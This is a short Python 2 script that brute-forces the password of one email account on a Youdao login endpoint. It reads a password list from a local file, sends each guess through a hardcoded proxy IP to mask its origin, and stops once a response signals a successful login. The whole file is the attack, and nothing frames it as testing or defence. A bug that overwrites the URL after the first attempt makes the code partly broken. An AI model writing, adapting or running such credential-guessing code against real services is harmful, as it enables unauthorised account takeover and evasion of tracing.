#coding:utf-8
import requests

# 登陆地址
url = "https://ke.youdao.com/login/acc/login?app=mobile&product=DICT&tp=urstoken&cf=7&show=true&format=json&username=%s&password=%s&um=true"
res = ""
f = open("d:\\pass.txt")
for pwd in f:
    print pwd.strip("\n")
    ip="219.153.76.77:8080"
    proxies = {"http":ip}
    url = url % ("huihuitestecho@163.com",pwd.strip("\n"))
    print url
    res = requests.get(url,proxies=proxies).text
    if "username" in res:
        print res
        break